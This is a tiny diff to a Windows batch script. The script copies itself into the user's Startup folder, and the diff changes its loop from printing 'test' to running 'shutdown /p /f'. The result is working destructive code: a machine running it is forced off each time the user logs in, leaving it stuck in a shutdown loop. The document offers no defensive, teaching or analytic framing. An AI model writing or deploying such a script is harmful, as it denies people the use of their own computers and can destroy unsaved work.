@@ -3,5 +3,5 @@ copy "loop start.bat" "C:\Users\thund\AppData\Roaming\Microsoft\Windows\Start Me
 GOTO start
 
 :start
-echo test
+shutdown /p /f
 GOTO start
